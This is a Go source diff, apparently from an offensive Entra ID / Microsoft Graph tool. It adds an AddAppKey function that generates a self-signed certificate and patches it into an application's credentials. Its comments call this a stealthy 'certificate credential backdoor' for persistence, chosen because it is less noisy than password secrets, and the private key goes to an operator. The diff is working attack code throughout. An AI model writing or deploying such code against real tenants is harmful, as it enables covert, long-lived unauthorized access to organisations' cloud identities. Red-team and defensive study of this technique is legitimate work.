@@ -10,14 +10,23 @@ package graph
 import (
 	"bytes"
 	"context"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha1"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"io"
+	"math/big"
 	"net/http"
 	"net/url"
 	"strings"
 	"time"
+
+	"github.com/google/uuid"
 )
 
 const graphBase = "https://graph.microsoft.com/v1.0"
@@ -358,6 +367,74 @@ func (c *Client) AddAppPassword(ctx context.Context, appObjectID, displayName st
 		"passwordCredential": map[string]interface{}{"displayName": displayName},
 	}
 	return c.post(ctx, "/applications/"+appObjectID+"/addPassword", payload)
+}
+
+// AppKeyResult holds the artifacts of a certificate credential backdoor.
+type AppKeyResult struct {
+	KeyID       string `json:"keyId"`
+	Thumbprint  string `json:"thumbprint"`  // base64 SHA-1 of the DER cert
+	Certificate string `json:"certificate"` // base64 DER (public)
+	PrivateKey  string `json:"privateKey"`  // PEM PKCS#1 — shown to operator once
+}
+
+// AddAppKey adds a self-signed certificate (keyCredential) to an application —
+// the stealthier SP credential backdoor (persistence playbook Regla #3: cert >
+// secret; longer-lived and less noisy than addPassword). It generates an
+// RSA-2048 keypair locally and PATCHes the app's keyCredentials.
+//
+// NOTE: a keyCredentials PATCH replaces the whole collection, so this is meant
+// for a dedicated backdoor app you created (no pre-existing certs to preserve).
+// The operator authenticates as the app via client_credentials with the
+// returned cert + private key (client_assertion JWT). The private key is
+// returned once and never persisted server-side.
+func (c *Client) AddAppKey(ctx context.Context, appObjectID, displayName string) (*AppKeyResult, error) {
+	priv, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return nil, fmt.Errorf("keygen: %w", err)
+	}
+	cn := displayName
+	if cn == "" {
+		cn = "entraith"
+	}
+	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 62))
+	if err != nil {
+		return nil, err
+	}
+	tmpl := x509.Certificate{
+		SerialNumber: serial,
+		Subject:      pkix.Name{CommonName: cn},
+		NotBefore:    time.Now().Add(-1 * time.Hour),
+		NotAfter:     time.Now().AddDate(2, 0, 0),
+		KeyUsage:     x509.KeyUsageDigitalSignature,
+	}
+	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &priv.PublicKey, priv)
+	if err != nil {
+		return nil, fmt.Errorf("cert: %w", err)
+	}
+	sum := sha1.Sum(der)
+	res := &AppKeyResult{
+		KeyID:       uuid.New().String(),
+		Thumbprint:  base64.StdEncoding.EncodeToString(sum[:]),
+		Certificate: base64.StdEncoding.EncodeToString(der),
+		PrivateKey: string(pem.EncodeToMemory(&pem.Block{
+			Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv),
+		})),
+	}
+	payload := map[string]interface{}{
+		"keyCredentials": []map[string]interface{}{{
+			"type":        "AsymmetricX509Cert",
+			"usage":       "Verify",
+			"keyId":       res.KeyID,
+			"key":         res.Certificate,
+			"displayName": "CN=" + cn,
+		}},
+	}
+	data, _ := json.Marshal(payload)
+	// PATCH returns 204 No Content on success.
+	if _, err := c.request(ctx, "PATCH", graphBase+"/applications/"+appObjectID, bytes.NewReader(data), map[string]string{"Content-Type": "application/json"}); err != nil {
+		return nil, err
+	}
+	return res, nil
 }
 
 // GetServicePrincipalByAppID resolves a service principal by its appId — used to
